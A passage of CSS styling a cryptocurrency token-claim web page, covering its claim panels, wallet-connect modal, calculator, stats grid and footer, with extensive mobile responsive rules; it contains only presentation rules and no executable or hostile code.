      border: 2px solid var(--border-color);
    }

    .feature-card:hover {
      transform: translateY(-5px);
      border-color: var(--accent-color);
    }

    .feature-card .feature-icon {
      font-size: 3rem;
      margin-bottom: 15px;
      display: block;
    }

    .feature-card h4 {
      color: var(--text-primary);
      font-size: 1.3rem;
      margin-bottom: 10px;
    }

    .feature-card p {
      color: var(--text-secondary);
      line-height: 1.5;
    }

    /* Footer */
    .footer {
      text-align: center;
      color: var(--text-secondary);
      padding: 30px 0;
      border-top: 1px solid var(--border-color);
    }

    .footer-content {
      display: flex;
      flex-direction: column;
      gap: 20px;
      align-items: center;
    }

    .footer-section h4 {
      color: var(--text-primary);
      margin-bottom: 15px;
      font-size: 1.1rem;
    }

    .social-links {
      display: flex;
      gap: 15px;
      flex-wrap: wrap;
      justify-content: center;
    }

    .social-link {
      display: flex;
      align-items: center;
      gap: 8px;
      color: var(--text-secondary);
      text-decoration: none;
      padding: 8px 16px;
      border-radius: 20px;
      background: var(--bg-card);
      transition: all 0.3s ease;
      border: 1px solid var(--border-color);
    }

    .social-link:hover {
      background: var(--bg-tertiary);
      color: var(--text-primary);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }

    .social-icon {
      font-size: 1.2rem;
    }

    /* Mobile Responsiveness */
    @media (max-width: 768px) {
      .nav-container {
        padding: 0 1rem;
        height: auto;
        flex-direction: column;
        gap: 1rem;
        padding: 1rem;
      }
      
      .nav-links {
        gap: 1rem;
        flex-wrap: wrap;
        justify-content: center;
      }
      
      .nav-actions {
        flex-direction: column;
        gap: 1rem;
        width: 100%;
      }
      
      .search-container {
        width: 100%;
        max-width: 300px;
      }
      
      .nav-search {
        width: 100%;
        font-size: 16px; /* Prevents zoom on iOS */
      }
      
      .nav-connect-btn {
        padding: 0.6rem 1.2rem;
        font-size: 0.85rem;
        width: 100%;
        justify-content: center;
        min-height: 44px; /* Touch-friendly */
      }
      
      .boost-task-section {
        padding: 20px;
        border-radius: 16px;
      }
      
      .task-item {
        flex-direction: column;
        align-items: center;
        gap: 16px;
        text-align: center;
        padding: 1rem;
      }
      
      .task-complete-btn {
        width: 100%;
        justify-content: center;
        min-height: 44px;
      }
      
      .hero {
        flex-direction: column;
        text-align: center;
        padding: 20px;
      }
      
      .hero-image {
        order: -1;
        margin-bottom: 20px;
      }
      
      .hero-img {
        max-width: 100%;
        height: auto;
      }
      
      .wallet-section {
        padding: 20px;
      }
      
      .social-links {
        flex-direction: column;
        gap: 10px;
      }
      
      .social-link {
        justify-content: center;
      }
      
      .footer-content {
        gap: 15px;
      }
      
      /* Footer Mobile Optimization */
      .footer-main {
        grid-template-columns: 1fr;
        gap: 2rem;
        text-align: center;
      }
      
      .footer-links {
        grid-template-columns: 1fr;
        gap: 2rem;
      }
      
      .footer-bottom-content {
        flex-direction: column;
        text-align: center;
      }
      
      /* Enhanced mobile hero section */
      .main-hero {
        padding: 2rem 1rem;
        min-height: 60vh;
        display: flex;
        flex-direction: column;
        justify-content: center;
      }
      
      .hero-title {
        font-size: 1.75rem;
        line-height: 1.3;
        margin-bottom: 1.5rem;
        word-wrap: break-word;
      }
      
      .random-token-display {
        padding: 1.5rem;
        margin: 1.5rem 0;
        border-radius: 16px;
      }
      
      .token-info h2 {
        font-size: 1.5rem;
        word-wrap: break-word;
      }
      
      .token-info p {
        font-size: 1rem;
        line-height: 1.5;
      }
      
      .claim-instructions-main {
        padding: 1.5rem;
        margin: 1.5rem 0;
        border-radius: 16px;
      }
      
      .claim-instructions-main h3 {
        font-size: 1.5rem;
        margin-bottom: 1rem;
        text-align: center;
      }
      
      .claim-instructions-main ol {
        padding-left: 1.5rem;
        text-align: left;
      }
      
      .claim-instructions-main li {
        margin-bottom: 0.75rem;
        font-size: 1rem;
        line-height: 1.6;
      }
      
      .ready-to-claim {
        padding: 1.5rem;
        margin: 1.5rem 0;
        border-radius: 16px;
        text-align: center;
      }
      
      .ready-to-claim h3 {
        font-size: 1.5rem;
        margin-bottom: 1rem;
      }
      
      .connect-btn-main {
        width: 100%;
        max-width: 300px;
        font-size: 1.1rem;
        padding: 1rem 1.5rem;
        margin: 0 auto;
        display: block;
        min-height: 44px;
      }
      
      .features-grid {
        grid-template-columns: 1fr;
        gap: 1.5rem;
        padding: 0 1rem;
      }
      
      .feature-card {
        padding: 1.5rem;
        border-radius: 16px;
        text-align: center;
      }
      
      .feature-icon {
        font-size: 2rem;
        margin-bottom: 1rem;
        display: inline-block;
        padding: 1rem;
        background: rgba(255, 255, 255, 0.1);
        border-radius: 50%;
        min-width: 80px;
        height: 80px;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      
      .calculator-container {
        padding: 1.5rem;
        margin: 1.5rem 0;
        border-radius: 16px;
      }
      
      .calculator-info h3 {
        font-size: 1.5rem;
        margin-bottom: 1rem;
        text-align: center;
      }
      
      .calculator-info p {
        font-size: 1rem;
        margin-bottom: 0.75rem;
        line-height: 1.6;
        text-align: center;
      }
      
      .calculator h4 {
        font-size: 1.25rem;
        margin-bottom: 1rem;
        text-align: center;
      }
      
      .stats {
        padding: 2rem 1rem;
      }
      
      .section-title {
        font-size: 1.75rem;
        margin-bottom: 1rem;
        text-align: center;
      }
      
      .section-subtitle {
        font-size: 1rem;
        margin-bottom: 2rem;
        text-align: center;
      }
      
      .stats-grid {
        grid-template-columns: 1fr;
        gap: 1.5rem;
      }
      
      .stat-item {
        padding: 1.5rem;
        border-radius: 16px;
        text-align: center;
      }
      
      .stat-number {
        font-size: 2rem;
        margin-bottom: 0.5rem;
      }
      
      .stat-label {
        font-size: 1rem;
        line-height: 1.4;
      }
      
      /* Mobile-specific improvements */
      .container {
        padding: 0 1rem;
      }
      
      .btn-icon {
        font-size: 1rem;
      }
      
      /* Touch-friendly button sizes */
      button, .nav-connect-btn, .connect-btn-main, .task-complete-btn {
        min-height: 44px;
        min-width: 44px;
      }
      
      /* Better spacing for mobile */
      section {
        margin: 2rem 0;
      }
      
      /* Improved mobile navigation */
      .navbar {
        box-shadow: 0 2px 20px rgba(0, 0, 0, 0.3);
        position: sticky;
        top: 0;
        z-index: 1000;
        backdrop-filter: blur(10px);
      }
      
      /* Mobile wallet modal improvements */
      .wallet-content {
        margin: 10% auto;
        padding: 25px;
        width: 90%;
        max-width: 450px;
      }
      
      .wallet-item {
        padding: 15px;
        min-height: 48px;
      }
      
      /* Additional mobile enhancements */
      .token-icon {
        width: 60px;
        height: 60px;
        margin: 0 auto 1rem;
      }
      
      .token-emoji-fallback {
        font-size: 2.5rem;
        width: 60px;
        height: 60px;
        margin: 0 auto 1rem;
      }
      
      .success-message {
        padding: 1.5rem;
        margin: 1.5rem 0;
        border-radius: 16px;
      }
      
      .success-content {
        text-align: center;
      }
      
      .success-icon {
        font-size: 3rem;
        margin: 0 auto 1rem;
        display: block;
      }
      
      .task-success-msg {
        margin-top: 1rem;
        padding: 1rem;
        border-radius: 12px;
      }
      
      .task-success-content {
        text-align: center;
        gap: 0.5rem;
      }
      
      /* Mobile form improvements */
      input, textarea, select {
        font-size: 16px; /* Prevents zoom on iOS */
        min-height: 44px;
        padding: 0.75rem;
      }
      
      /* Mobile card improvements */
      .card, .feature-card, .stat-item {
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
        transition: transform 0.2s ease, box-shadow 0.2s ease;
      }
      
      .card:hover, .feature-card:hover, .stat-item:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 25px rgba(0, 0, 0, 0.2);
      }
      
      /* Mobile animation improvements */
      @media (prefers-reduced-motion: no-preference) {
        .feature-card, .stat-item, .token-display {
          animation: fadeInUp 0.6s ease-out;
        }
        
        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
      }
      
      /* Mobile accessibility improvements */
      .btn-icon, .feature-icon, .task-icon {
        -webkit-tap-highlight-color: transparent;
        user-select: none;
      }
      
      /* Mobile performance optimizations */
      .navbar, .main-hero, .stats, .footer-main {
        will-change: transform;
        transform: translateZ(0);
      }
      
      /* Additional mobile optimizations */
      /* Mobile navigation improvements */
      .navbar {
        transition: all 0.3s ease;
      }
      
      /* Mobile touch improvements */
      .nav-connect-btn, .connect-btn-main, .task-complete-btn {
        -webkit-tap-highlight-color: transparent;
        touch-action: manipulation;
      }
      
      /* Mobile spacing improvements */
      .main-hero > * + * {
        margin-top: 1.5rem;
      }
      
      .claim-instructions-main > * + * {
        margin-top: 1rem;
      }
      
      .boost-task-section > * + * {
        margin-top: 1rem;
      }
      
      /* Mobile text improvements */
      .hero-title, .section-title {
        hyphens: auto;
        word-break: break-word;
      }
      
      /* Mobile button improvements */
      .connect-btn-main {
        background: linear-gradient(135deg, var(--accent-color), var(--accent-hover));
        border: none;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
      }
      
      .connect-btn-main:active {
        transform: translateY(1px);
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
      }
      
      /* Mobile card shadows */
      .random-token-display, .claim-instructions-main, .boost-task-section, .ready-to-claim {
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        backdrop-filter: blur(10px);
      }
      
      /* Mobile loading states */
      .btn-icon {
        transition: all 0.2s ease;
      }
      
      /* Mobile success states */
      .success-message {
        animation: slideInUp 0.4s ease-out;
      }
      
      @keyframes slideInUp {
        from {
          opacity: 0;
          transform: translateY(20px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }
    }

    @media (max-width: 480px) {
      .container {
        padding: 15px;
      }
      
      .nav-container {
        padding: 0 0.75rem;
        flex-direction: column;
        gap: 1rem;
      }
      
      .nav-links {
        flex-direction: column;
        gap: 0.75rem;
        align-items: center;
      }
      
      .nav-actions {
        gap: 0.75rem;
      }
      
      .search-container {
        max-width: 250px;
      }
      
      .nav-connect-btn {
        padding: 0.75rem 1.5rem;
        font-size: 0.9rem;
      }
      
      .main-title {
        font-size: 1.8rem;
      }
      
      .logo-text {
        font-size: 2rem;
      }
      
      .hero-title {
        font-size: 1.5rem;
      }
      
      /* Enhanced mobile responsiveness */
      .main-hero {
        padding: 1.5rem 1rem;
        min-height: 50vh;
      }
      
      .hero-title {
        font-size: 1.4rem;
        line-height: 1.4;
        margin-bottom: 1rem;
      }
      
      .random-token-display {
        padding: 1rem;
        margin: 1rem 0;
      }
      
      .token-info h2 {
        font-size: 1.3rem;
      }
      
      .token-info p {
        font-size: 0.9rem;
      }
      
      .claim-instructions-main {
        padding: 1rem;
        margin: 1rem 0;
      }
      
      .claim-instructions-main h3 {
        font-size: 1.3rem;
      }
      
      .claim-instructions-main li {
        font-size: 0.9rem;
        margin-bottom: 0.5rem;
      }
      
      .boost-task-section {
        padding: 1rem;
        margin: 1rem 0;
      }
      
      .boost-task-section h3 {
        font-size: 1.3rem;
      }
      
      .task-item {
        padding: 0.75rem;
        gap: 0.75rem;
      }
      
      .task-icon {
        font-size: 1rem;
        padding: 0.5rem;
        min-width: 40px;
        height: 40px;
      }
      
      .ready-to-claim {
        padding: 1rem;
        margin: 1rem 0;
      }
      
      .ready-to-claim h3 {
        font-size: 1.3rem;
      }
      
      .connect-btn-main {
        font-size: 1rem;
        padding: 0.75rem 1.25rem;
        max-width: 280px;
      }
      
      .features-grid {
        gap: 1rem;
        padding: 0 0.5rem;
      }
      
      .feature-card {
        padding: 1rem;
      }
      
      .feature-icon {
        font-size: 1.5rem;
        min-width: 60px;
        height: 60px;
      }
      
      .calculator-container {
        padding: 1rem;
        margin: 1rem 0;
      }
      
      .calculator-info h3 {
        font-size: 1.3rem;
      }
      
      .calculator-info p {
        font-size: 0.9rem;
      }
      
      .calculator h4 {
        font-size: 1.1rem;
      }
      
      .stats {
        padding: 1.5rem 1rem;
      }
      
      .section-title {
        font-size: 1.5rem;
      }
      
      .section-subtitle {
        font-size: 0.9rem;
      }
      
      .stats-grid {
        gap: 1rem;
      }
      
      .stat-item {
        padding: 1rem;
      }
      
      .stat-number {
        font-size: 1.5rem;
      }
      
      .stat-label {
        font-size: 0.9rem;
      }
      
      .footer-main {
        padding: 1.5rem 1rem;
        gap: 1.5rem;
      }
      
      .footer-brand h3 {
        font-size: 1.3rem;
      }
      
      .footer-links {
        gap: 1rem;
      }
      
      .footer-column h4 {
        font-size: 1.1rem;
      }
      
      .footer-column li a {
        font-size: 0.85rem;
      }
      
      .footer-bottom {
        padding: 1rem;
        gap: 0.75rem;
      }
      
      .managed-by, .copyright {
        font-size: 0.8rem;
      }
      
      /* Touch-friendly improvements */
      button, .nav-connect-btn, .connect-btn-main, .task-complete-btn {
        min-height: 48px;
        min-width: 48px;
      }
      
      /* Better mobile spacing */
      section {
        margin: 1.5rem 0;
      }
      
      /* Mobile wallet modal */
      .wallet-content {
        margin: 10% auto;
        padding: 20px;
        width: 95%;
        max-width: 400px;
      }
      
      .wallet-item {
        padding: 12px;
        min-height: 48px;
      }
    }
  
    /* Wallet Modal Styles */
    .wallet-modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.5);
      backdrop-filter: blur(5px);
    }

    .wallet-content {
      background-color: var(--bg-overlay);
      margin: 15% auto;
      padding: 30px;
      border-radius: 20px;
      width: 90%;
      max-width: 500px;
      position: relative;
      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
      border: 2px solid var(--accent-color);
    }

    .close-btn {
      position: absolute;
      right: 20px;
      top: 20px;
      font-size: 28px;
      font-weight: bold;
      color: var(--text-muted);
      cursor: pointer;
      transition: color 0.3s;
    }

    .close-btn:hover {
      color: var(--text-primary);
    }

    .wallet-list {
      margin-top: 20px;
    }

    .wallet-item {
      display: flex;
      align-items: center;
      gap: 15px;
      padding: 15px;
      border: 2px solid var(--border-color);
      border-radius: 12px;
      margin-bottom: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      background: var(--bg-card);
    }

    .wallet-item:hover {
      border-color: var(--accent-color);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(255, 210, 63, 0.3);
    }

    .wallet-icon {
      width: 32px;
      height: 32px;
      border-radius: 8px;
    }

    .wallet-name {
      flex: 1;
      font-weight: 600;
      color: var(--text-primary);
    }

    .wallet-status {
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 500;
    }

    .wallet-status.available {
      background: rgba(6, 255, 165, 0.2);
      color: var(--success-color);
    }

    .wallet-status.not-installed {
      background: rgba(255, 0, 110, 0.2);
      color: var(--danger-color);
    }

    /* Status Container Styles */
    .status-container {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 2000;
      max-width: 400px;
    }

    .status-message {
      background: var(--bg-card);
      border-radius: 8px;
      padding: 12px 16px;
      margin-bottom: 10px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      border-left: 4px solid var(--accent-color);
      animation: slideIn 0.3s ease-out;
      font-weight: 500;
      color: var(--text-primary);
    }

    .status-message.success {
      border-left-color: var(--success-color);
      background: rgba(6, 255, 165, 0.1);
      color: var(--success-color);
    }

    .status-message.error {
      border-left-color: var(--danger-color);
      background: rgba(255, 0, 110, 0.1);
      color: var(--danger-color);
    }

    .status-message.warning {
      border-left-color: var(--secondary-color);
      background: rgba(247, 147, 30, 0.1);
      color: var(--secondary-color);
    }

    .status-message.loading {
      border-left-color: var(--accent-color);
      background: rgba(255, 210, 63, 0.1);
      color: var(--accent-color);
    }

    @keyframes slideIn {
      from {
        transform: translateX(100%);
        opacity: 0;
      }
      to {
        transform: translateX(0);
        opacity: 1;
      }
    }
    
    /* Gamified Animations */
    @keyframes float {
      0%, 100% {
        transform: translateY(0px);
      }
      50% {
        transform: translateY(-20px);
      }
    }
    
    @keyframes bounce {
      0%, 20%, 50%, 80%, 100% {
        transform: translateY(0);
      }
      40% {
        transform: translateY(-10px);
      }
      60% {
        transform: translateY(-5px);
      }
    }
    
    @keyframes pulse {
      0% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.05);
      }
      100% {
        transform: scale(1);
      }
    }
    
    @keyframes shake {
      0%, 100% {
        transform: translateX(0);
      }
      10%, 30%, 50%, 70%, 90% {
        transform: translateX(-5px);
      }
      20%, 40%, 60%, 80% {
        transform: translateX(5px);
      }
    }
    

    
    /* Enhanced Wallet Section */
    .wallet-section {
      text-align: center;
      margin-bottom: 50px;
      background: var(--bg-overlay);
      padding: 40px;
      border-radius: var(--border-radius);
      backdrop-filter: blur(20px);
      box-shadow: var(--shadow-strong);
      border: 3px solid var(--accent-color);
    }
    
    .wallet-title {
      font-family: 'Fredoka One', cursive;
      font-size: 1.8rem;
      color: var(--text-primary);
      margin-bottom: 15px;
      background: var(--gradient-primary);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    
    .wallet-description {
      color: var(--text-secondary);
      margin-bottom: 25px;
      line-height: 1.6;
      font-weight: 500;
    }
    
    .connect-btn {
      background: var(--gradient-primary);
      color: var(--text-primary);
      border: none;
      padding: 15px 30px;
      font-size: 1.1rem;
      border-radius: 50px;
      cursor: pointer;
      transition: var(--transition);
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 0 auto;
      box-shadow: var(--shadow-soft);
      border: 3px solid var(--accent-color);
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    .connect-btn:hover {
      transform: translateY(-3px) scale(1.05);
      box-shadow: var(--shadow-strong);
    }
    
    .btn-icon {
      font-size: 1.2rem;
      animation: pulse 2s infinite;
    }
    
    /* Calculator Section Styles */
    .calculator-section {
      padding: 100px 0;
      background: var(--gradient-secondary);
      color: var(--text-primary);
      position: relative;
    }
    
    .calculator-section::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 100px;
      background: var(--bg-primary);
      clip-path: polygon(0 0, 100% 30%, 100% 100%, 0 100%);
    }
    
    .calculator-container {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 4rem;
      align-items: center;
      max-width: 1000px;
      margin: 0 auto;
      position: relative;
      z-index: 2;
    }
    
    .calculator-info h3 {
      font-family: 'Fredoka One', cursive;
      font-size: 2.5rem;
      margin-bottom: 1.5rem;
      color: var(--accent-color);
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
    }
    
    .calculator-info p {
      font-size: 1.2rem;
      margin-bottom: 1.5rem;
      line-height: 1.7;
      color: var(--text-secondary);
    }
    
    .calculator {
      background: var(--bg-card);
      backdrop-filter: blur(20px);
      padding: 2.5rem;
      border-radius: var(--border-radius);
      border: 2px solid var(--border-color);
      box-shadow: var(--shadow-strong);
    }
    
    .calculator h4 {
      text-align: center;
      margin-bottom: 2rem;
      font-size: 2rem;
      color: var(--accent-color);
      font-family: 'Fredoka One', cursive;
    }
    
    .calculator-group {
      margin-bottom: 1.5rem;
    }
    
    .calculator-label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 600;
      color: var(--accent-color);
      font-size: 1.1rem;
    }
    
    .calculator input {
      width: 100%;
      padding: 1rem;
      border: 2px solid var(--border-color);
      border-radius: 15px;
      font-size: 1rem;
      background: var(--bg-card);
      transition: var(--transition);
      color: var(--text-primary);
    }
    
    .calculator input:focus {
      outline: none;
      border-color: var(--accent-color);
      box-shadow: 0 0 0 3px rgba(255, 210, 63, 0.3);
    }
    
    .calculator button {
      width: 100%;
      padding: 1.2rem;
      background: var(--gradient-accent);
      color: var(--text-primary);
      border: none;
      border-radius: 15px;
      font-size: 1.1rem;
      font-weight: bold;
      cursor: pointer;
      transition: var(--transition);
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: var(--shadow-soft);
    }
    
    .calculator button:hover {
      transform: translateY(-3px);
      box-shadow: var(--shadow-strong);
    }
    
    .result {
      margin-top: 1.5rem;
      padding: 1.5rem;
      background: var(--bg-card);
      border-radius: 15px;
      text-align: center;
      font-weight: bold;
      font-size: 1.1rem;
      border: 2px solid var(--accent-color);
      color: var(--text-primary);
    }
    
    /* Stats Section Styles */
    .stats {
      padding: 100px 0;
      background: var(--bg-tertiary);
      position: relative;
    }
    
    .stats::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 100px;
      background: var(--gradient-secondary);
      clip-path: polygon(0 0, 100% 70%, 100% 100%, 0 100%);
    }
    
    .section-title {
      text-align: center;
      font-family: 'Outfit', sans-serif;
      font-size: 3rem;
      font-weight: 800;
      margin-bottom: 1rem;
      background: var(--gradient-primary);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      position: relative;
      z-index: 2;
      letter-spacing: -0.02em;
    }
    
    .section-subtitle {
      text-align: center;
      font-size: 1.3rem;
      color: var(--text-muted);
      margin-bottom: 4rem;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
      position: relative;
      z-index: 2;
    }
    
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 3rem;
      text-align: center;
      margin-top: 4rem;
      position: relative;
      z-index: 2;
    }
    
    .stat-item {
      padding: 3rem 2rem;
      background: var(--bg-card);
      border-radius: var(--border-radius);
      box-shadow: var(--shadow-soft);
      transition: var(--transition);
      border: 3px solid transparent;
      position: relative;
      overflow: hidden;
    }
    
    .stat-item::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: var(--gradient-primary);
      opacity: 0;
      transition: var(--transition);
      z-index: -1;
    }
    
    .stat-item:hover::before {
      opacity: 0.1;
    }
    
    .stat-item:hover {
      transform: translateY(-10px);
      box-shadow: var(--shadow-strong);
    }
    
    .stat-number {
      font-family: 'Outfit', sans-serif;
      font-size: 4rem;
      font-weight: 900;
      background: var(--gradient-primary);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      margin-bottom: 1rem;
      display: block;
      letter-spacing: -0.03em;
    }
    
    .stat-label {
      font-family: 'Outfit', sans-serif;
      color: var(--text-secondary);
      font-size: 1.2rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    /* Enhanced Footer */
    /* Enhanced Footer - Mirrored from Solana.com */
    .footer {
      color: var(--text-primary);
      padding: 60px 0 30px 0;
      background: var(--bg-overlay);
      backdrop-filter: blur(20px);
      border-top: 1px solid rgba(99, 102, 241, 0.1);
      margin-top: 50px;
    }
    
    .footer-content {
      max-width: 1400px;
      margin: 0 auto;
      padding: 0 2rem;
    }
    
    .footer-main {
      display: grid;
      grid-template-columns: 1fr 2fr;
      gap: 4rem;
      margin-bottom: 3rem;
    }
    
    .footer-brand h3 {
      font-family: 'Outfit', sans-serif;
      font-size: 1.8rem;
      font-weight: 700;
      color: var(--text-primary);
      margin-bottom: 1rem;
    }
    
    .footer-brand p {
      color: var(--text-secondary);
      font-size: 1rem;
      line-height: 1.6;
      max-width: 300px;
    }
    
    .footer-links {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 3rem;
    }
    
    .footer-column h4 {
      color: var(--text-primary);
      margin-bottom: 1.5rem;
      font-size: 1.1rem;
      font-family: 'Outfit', sans-serif;
      font-weight: 600;
    }
    
    .footer-column ul {
      list-style: none;
      padding: 0;
      margin: 0;
    }
    
    .footer-column li {
      margin-bottom: 0.75rem;
    }
    
    .footer-column a {
      color: var(--text-secondary);
      text-decoration: none;
      font-size: 0.95rem;
      transition: color 0.3s ease;
      font-family: 'Inter', sans-serif;
    }
    
    .footer-column a:hover {
      color: var(--primary-color);
    }
    
    .footer-bottom {
      border-top: 1px solid rgba(99, 102, 241, 0.1);
      padding-top: 2rem;
    }
    
    .footer-bottom-content {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 1rem;
    }
    
    .managed-by {
      color: var(--text-muted);
      font-size: 0.9rem;
      font-family: 'Inter', sans-serif;
    }
    
    .copyright {
      color: var(--text-secondary);
      font-size: 0.9rem;
      font-family: 'Inter', sans-serif;
    }
    


    /* Enhanced Mobile Responsiveness - Mobile First Approach */
    
    /* Mobile-specific touch improvements */
    @media (hover: none) and (pointer: coarse) {
      .connect-btn,
      .feature-card,
      .hero-stat,
      .social-link,
      .wallet-item {
        cursor: pointer;
        -webkit-tap-highlight-color: transparent;
        touch-action: manipulation;
      }
      
      .connect-btn:active,
      .feature-card:active,
      .hero-stat:active,
      .social-link:active,
      .wallet-item:active {
        transform: scale(0.98);
        transition: transform 0.1s ease;
      }
    }
    
    /* Mobile landscape orientation optimization */
    @media (max-width: 768px) and (orientation: landscape) {
      .hero {
        flex-direction: row;
        gap: 20px;
        padding: 20px;
      }
      
      .hero-image {
        order: 0;
        margin-bottom: 0;
        flex: 0 0 40%;
      }
      
      .hero-content {
        flex: 1;
      }
      
      .hero-stats {
        flex-direction: row;
        gap: 1rem;
      flex-wrap: wrap;
      justify-content: center;
    }
    
      .hero-stat {
        min-width: 120px;
        max-width: 140px;
      }
    }
    
    /* Mobile portrait orientation optimization */
    @media (max-width: 768px) and (orientation: portrait) {
      .hero {
        flex-direction: column;
        gap: 25px;
        padding: 25px 20px;
      }
      
      .hero-image {
        order: -1;
        margin-bottom: 20px;
      }
      
      .hero-stats {
        flex-direction: column;
        gap: 1.5rem;
      }
      
      .hero-stat {
        max-width: 180px;
      }
    }
    
    /* Large Tablets and Small Desktops */
    @media (max-width: 1024px) {
      .container {
        max-width: 95%;
        padding: 0 20px;
      }
      
      .hero {
        gap: 30px;
        padding: 30px;
      }
      
      .hero-title {
        font-size: 1.6rem;
      }
      
      .hero-description {
        font-size: 1rem;
      }
      
      .features-grid {
        grid-template-columns: repeat(2, 1fr);
        gap: 20px;
      }
      
      .calculator-container {
        gap: 3rem;
        padding: 0 20px;
      }
    }
    
    /* Tablets and Medium Mobile */
    @media (max-width: 768px) {
      .container {
        max-width: 100%;
        padding: 0 15px;
      }
      
      /* Header Mobile Optimization */
      .header {
        padding: 1rem;
        margin-bottom: 30px;
      }
      
      .logo {
        flex-direction: column;
        gap: 15px;
        margin-bottom: 15px;
      }
      
      .logo-img {
        width: 50px;
        height: 50px;
      }
      
      .logo-text {
        font-size: 2.2rem;
      }
      
      .main-title {
        font-size: 1.8rem;
        margin-bottom: 8px;
      }
      
      .subtitle {
        font-size: 1rem;
        margin-bottom: 15px;
      }
      
      /* Hero Section Mobile Optimization */
      .hero {
        flex-direction: column;
        text-align: center;
        padding: 25px 20px;
        gap: 25px;
      }
      
      .hero-image {
        order: -1;
        margin-bottom: 20px;
      }
      
      .hero-img {
        max-width: 100%;
        height: auto;
      }
      
      .hero-title {
        font-size: 1.5rem;
        margin-bottom: 12px;
      }
      
      .hero-description {
        font-size: 0.95rem;
        line-height: 1.5;
        margin-bottom: 20px;
      }
      
      /* Hero Stats Mobile Optimization */
      .hero-stats {
        flex-direction: column;
        gap: 1.5rem;
        display: flex !important;
        visibility: visible !important;
        opacity: 1 !important;
        margin-bottom: 2rem;
        justify-content: center;
        align-items: center;
      }
      
      .hero-stat {
        min-width: auto;
        display: block !important;
        visibility: visible !important;
        opacity: 1 !important;
        padding: 1.2rem 1.8rem;
        margin: 0 auto;
        max-width: 180px;
        width: 100%;
      }
      
      .hero-stat-number {
        font-size: 2.2rem;
      }
      
      .hero-stat-label {
        font-size: 0.8rem;
      }
      
      /* Hero Features Mobile Optimization */
      .hero-features {
        gap: 15px;
        justify-content: center;
        flex-wrap: wrap;
      }
      
      .feature {
        padding: 8px 12px;
        font-size: 0.9rem;
      }
      
      /* Features Section Mobile Optimization */
      .features {
        margin-bottom: 40px;
      }
      
      .features-title {
        font-size: 1.8rem;
        margin-bottom: 25px;
      }
      
      .features-grid {
        grid-template-columns: 1fr;
        gap: 20px;
      }
      
      .feature-card {
        padding: 25px 20px;
      }
      
      .feature-card .feature-icon {
        font-size: 2.5rem;
        margin-bottom: 12px;
      }
      
      .feature-card h4 {
        font-size: 1.2rem;
        margin-bottom: 8px;
      }
      
      .feature-card p {
        font-size: 0.9rem;
        line-height: 1.5;
      }
      
      /* Calculator Section Mobile Optimization */
      .calculator-section {
        padding: 60px 0;
      }
      
      .calculator-container {
        grid-template-columns: 1fr;
        gap: 2rem;
        padding: 0 20px;
      }
      
      .calculator-info h3 {
        font-size: 2rem;
        text-align: center;
        margin-bottom: 1.2rem;
      }
      
      .calculator-info p {
        text-align: center;
        font-size: 1rem;
        line-height: 1.6;
      }
      
      .calculator {
        padding: 2rem 1.5rem;
      }
      
      .calculator h4 {
        font-size: 1.8rem;
        margin-bottom: 1.5rem;
      }
      
      /* Wallet Section Mobile Optimization */
      .wallet-section {
        padding: 30px 20px;
        margin-bottom: 40px;
      }
      
      .wallet-title {
        font-size: 1.6rem;
        margin-bottom: 12px;
      }
      
      .wallet-description {
        font-size: 0.95rem;
        margin-bottom: 20px;
        line-height: 1.5;
      }
      
      .connect-btn {
        padding: 12px 25px;
        font-size: 1rem;
        width: 100%;
        max-width: 280px;
      }
      
      /* Footer Mobile Optimization */
      .footer {
        padding: 25px 0;
      }
      
      .footer-content {
        gap: 20px;
        padding: 0 20px;
      }
      
      .social-links {
        flex-direction: column;
        gap: 12px;
        align-items: center;
      }
      
      .social-link {
        justify-content: center;
        width: 100%;
        max-width: 200px;
        padding: 10px 20px;
      }
      
      /* Stats Grid Mobile Optimization */
      .stats {
        padding: 60px 0;
      }
      
      .stats::before {
        height: 60px;
      }
      
      .stats-grid {
        grid-template-columns: repeat(2, 1fr);
        gap: 1.5rem;
        padding: 0 20px;
        margin-top: 2rem;
      }
      
      .stat-item {
        padding: 2rem 1.5rem;
      }
      
      .stat-number {
        font-size: 2.5rem;
      }
      
      .stat-label {
        font-size: 1rem;
      }
      
      .section-title {
        font-size: 2.2rem;
        font-weight: 800;
      }
      
